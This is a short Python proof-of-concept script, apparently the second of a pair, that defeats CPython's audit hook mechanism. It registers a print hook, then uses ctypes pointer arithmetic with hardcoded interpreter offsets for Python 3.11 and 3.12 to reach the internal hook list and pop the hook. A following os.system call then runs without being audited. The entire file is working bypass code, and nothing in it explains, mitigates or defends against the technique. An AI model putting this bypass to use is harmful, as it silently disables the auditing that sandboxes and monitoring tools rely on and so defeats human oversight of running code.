#!/usr/bin/env python3.12

### POC2.py
### only use offset to pop the audit hook

import ctypes, sys, os
# the offsets are from POC.py: 
# Python 3.11 = 0xe00
# Python 3.12 = 0x41448
sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))
obj = ctypes.byref(ctypes.py_object(()))

os.system("echo 'test audit hook -- this will trigger hook'")

ctypes.cast(
    ctypes.cast(
        ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 , ctypes.POINTER(ctypes.c_uint64)
    ).contents.value
    , ctypes.py_object
).value.pop()


os.system("echo 'test audit hook -- this will not'")